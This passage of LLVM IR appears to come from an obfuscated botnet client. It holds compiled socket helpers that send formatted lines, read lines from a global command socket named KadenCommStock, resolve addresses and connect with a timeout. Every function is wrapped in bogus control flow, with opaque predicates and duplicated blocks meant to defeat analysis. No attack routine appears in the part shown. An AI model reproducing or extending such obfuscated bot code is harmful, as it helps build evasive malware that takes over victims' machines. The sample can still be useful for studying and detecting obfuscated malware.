  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #3
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i32, i32* %11, align 4
  %32 = load i8*, i8** %14, align 8
  %33 = load i8*, i8** %14, align 8
  %34 = call i64 @strlen(i8* %33) #9
  %35 = call i64 @send(i32 %31, i8* %32, i64 %34, i32 16384)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %16, align 4
  %37 = load i8*, i8** %14, align 8
  call void @free(i8* %37) #3
  %38 = load i32, i32* %16, align 4
  %39 = load i32, i32* @x.29
  %40 = load i32, i32* @y.30
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %2
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca [1 x %struct.__va_list_tag], align 16
  %52 = alloca i32, align 4
  store i32 %0, i32* %47, align 4
  store i8* %1, i8** %48, align 8
  %53 = call noalias i8* @malloc(i64 2048) #3
  store i8* %53, i8** %49, align 8
  %54 = load i8*, i8** %49, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 1, i1 false)
  %55 = load i8*, i8** %49, align 8
  store i8* %55, i8** %50, align 8
  %56 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %57 = bitcast %struct.__va_list_tag* %56 to i8*
  call void @llvm.va_start(i8* %57)
  %58 = load i8*, i8** %48, align 8
  %59 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %60 = call i32 @print(i8** %49, i8* %58, %struct.__va_list_tag* %59)
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %62 = bitcast %struct.__va_list_tag* %61 to i8*
  call void @llvm.va_end(i8* %62)
  %63 = load i8*, i8** %50, align 8
  %64 = load i8*, i8** %50, align 8
  %65 = call i64 @strlen(i8* %64) #9
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 10, i8* %66, align 1
  %67 = load i32, i32* %47, align 4
  %68 = load i8*, i8** %50, align 8
  %69 = load i8*, i8** %50, align 8
  %70 = call i64 @strlen(i8* %69) #9
  %71 = call i64 @send(i32 %67, i8* %68, i64 %70, i32 16384)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %52, align 4
  %73 = load i8*, i8** %50, align 8
  call void @free(i8* %73) #3
  %74 = load i32, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10

; <label>:28:                                     ; preds = %10
  br label %29

; <label>:29:                                     ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

; <label>:48:                                     ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

; <label>:50:                                     ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29

; <label>:53:                                     ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %90

; <label>:59:                                     ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %59
  %72 = load i32, i32* @x.31
  %73 = load i32, i32* @y.32
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %71
  %80 = load i32, i32* %3, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %3, align 4
  %82 = load i32, i32* @x.31
  %83 = load i32, i32* @y.32
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:90:                                     ; preds = %55
  %91 = load i8*, i8** %2, align 8
  %92 = load i32, i32* %3, align 4
  %93 = load i32, i32* %4, align 4
  %94 = sub nsw i32 %92, %93
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %91, i64 %95
  store i8 0, i8* %96, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %71
  %97 = load i32, i32* %3, align 4
  %_ = shl i32 %97, 1
  %_1 = sub i32 0, %97
  %gen = add i32 %_1, 1
  %_2 = shl i32 %97, 1
  %_3 = shl i32 %97, 1
  %_4 = sub i32 %97, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 0, %97
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %97
  %gen9 = add i32 %_8, 1
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #3
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.35
  %5 = load i32, i32* @y.36
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.35
  %33 = load i32, i32* @y.36
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #3, !srcloc !1
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %150

; <label>:65:                                     ; preds = %49
  %66 = load i32, i32* @x.35
  %67 = load i32, i32* @y.36
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @x.35
  %75 = load i32, i32* @y.36
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart28, %originalBBpart24
  %83 = load i32, i32* %21, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %133

; <label>:85:                                     ; preds = %82
  %86 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %86, align 8
  %87 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %87, align 8
  br label %88

; <label>:88:                                     ; preds = %85
  %89 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %90 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 0
  %91 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %90) #3, !srcloc !2
  %92 = extractvalue { i64, i64* } %91, 0
  %93 = extractvalue { i64, i64* } %91, 1
  %94 = trunc i64 %92 to i32
  store i32 %94, i32* %22, align 4
  %95 = ptrtoint i64* %93 to i64
  %96 = trunc i64 %95 to i32
  store i32 %96, i32* %23, align 4
  br label %97

; <label>:97:                                     ; preds = %88
  %98 = load i32, i32* %13, align 4
  %99 = srem i32 %98, 64
  %100 = zext i32 %99 to i64
  %101 = shl i64 1, %100
  %102 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %103 = load i32, i32* %13, align 4
  %104 = sdiv i32 %103, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %102, i64 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %107, %101
  store i64 %108, i64* %106, align 8
  %109 = load i32, i32* %13, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %111, i32* %20, align 4
  %112 = icmp sle i32 %111, 0
  br i1 %112, label %113, label %132

; <label>:113:                                    ; preds = %97
  %114 = load i32, i32* @x.35
  %115 = load i32, i32* @y.36
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i32, i32* %21, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %21, align 4
  %124 = load i32, i32* @x.35
  %125 = load i32, i32* @y.36
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %82

; <label>:132:                                    ; preds = %97
  br label %133

; <label>:133:                                    ; preds = %132, %82
  %134 = load i32, i32* @x.35
  %135 = load i32, i32* @y.36
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i32, i32* @x.35
  %143 = load i32, i32* @y.36
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %150

; <label>:150:                                    ; preds = %originalBBpart212, %49
  store i32 0, i32* %26, align 4
  %151 = load i8*, i8** %14, align 8
  store i8* %151, i8** %25, align 8
  br label %152

; <label>:152:                                    ; preds = %202, %150
  %153 = load i32, i32* %15, align 4
  %154 = add nsw i32 %153, -1
  store i32 %154, i32* %15, align 4
  %155 = icmp sgt i32 %153, 1
  br i1 %155, label %156, label %205

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @KadenCommStock, align 4
  %158 = call i64 @recv(i32 %157, i8* %24, i64 1, i32 0)
  %159 = icmp ne i64 %158, 1
  br i1 %159, label %160, label %178

; <label>:160:                                    ; preds = %156
  %161 = load i32, i32* @x.35
  %162 = load i32, i32* @y.36
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = load i8*, i8** %25, align 8
  store i8 0, i8* %169, align 1
  store i32 -1, i32* %12, align 4
  %170 = load i32, i32* @x.35
  %171 = load i32, i32* @y.36
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %208

; <label>:178:                                    ; preds = %156
  %179 = load i8, i8* %24, align 1
  %180 = load i8*, i8** %25, align 8
  %181 = getelementptr inbounds i8, i8* %180, i32 1
  store i8* %181, i8** %25, align 8
  store i8 %179, i8* %180, align 1
  %182 = load i8, i8* %24, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 10
  br i1 %184, label %185, label %202

; <label>:185:                                    ; preds = %178
  %186 = load i32, i32* @x.35
  %187 = load i32, i32* @y.36
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %185
  %194 = load i32, i32* @x.35
  %195 = load i32, i32* @y.36
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %205

; <label>:202:                                    ; preds = %178
  %203 = load i32, i32* %26, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %26, align 4
  br label %152

; <label>:205:                                    ; preds = %originalBBpart220, %152
  %206 = load i8*, i8** %25, align 8
  store i8 0, i8* %206, align 1
  %207 = load i32, i32* %26, align 4
  store i32 %207, i32* %12, align 4
  br label %208

; <label>:208:                                    ; preds = %205, %originalBBpart216
  %209 = load i32, i32* %12, align 4
  ret i32 %209

originalBBalteredBB:                              ; preds = %originalBB, %3
  %210 = alloca i32, align 4
  %211 = alloca i32, align 4
  %212 = alloca i8*, align 8
  %213 = alloca i32, align 4
  %214 = alloca %struct.fd_set, align 8
  %215 = alloca %struct.timeval, align 8
  %216 = alloca i32, align 4
  %217 = alloca i32, align 4
  %218 = alloca i32, align 4
  %219 = alloca i32, align 4
  %220 = alloca i32, align 4
  %221 = alloca i32, align 4
  %222 = alloca i8, align 1
  %223 = alloca i8*, align 8
  %224 = alloca i32, align 4
  store i32 %0, i32* %211, align 4
  store i8* %1, i8** %212, align 8
  store i32 %2, i32* %213, align 4
  %225 = load i8*, i8** %212, align 8
  %226 = load i32, i32* %213, align 4
  %227 = sext i32 %226 to i64
  call void @llvm.memset.p0i8.i64(i8* %225, i8 0, i64 %227, i32 1, i1 false)
  %228 = getelementptr inbounds %struct.timeval, %struct.timeval* %215, i32 0, i32 0
  store i64 30, i64* %228, align 8
  %229 = getelementptr inbounds %struct.timeval, %struct.timeval* %215, i32 0, i32 1
  store i64 0, i64* %229, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %230 = load i32, i32* %21, align 4
  %_ = shl i32 %230, 1
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %21, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %232 = load i8*, i8** %25, align 8
  store i8 0, i8* %232, align 1
  store i32 -1, i32* %12, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %185
  br label %originalBB18
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %148

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %139

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* @x.37
  %47 = load i32, i32* @y.38
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = call i32* @__errno_location() #10
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, 115
  %57 = load i32, i32* @x.37
  %58 = load i32, i32* @y.38
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %137

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #3, !srcloc !3
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %135

; <label>:95:                                     ; preds = %79
  %96 = load i32, i32* @x.37
  %97 = load i32, i32* @y.38
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %95
  store i32 4, i32* %13, align 4
  %104 = load i32, i32* %6, align 4
  %105 = bitcast i32* %14 to i8*
  %106 = call i32 @getsockopt(i32 %104, i32 1, i32 4, i8* %105, i32* %13) #3
  %107 = load i32, i32* %14, align 4
  %108 = icmp ne i32 %107, 0
  %109 = load i32, i32* @x.37
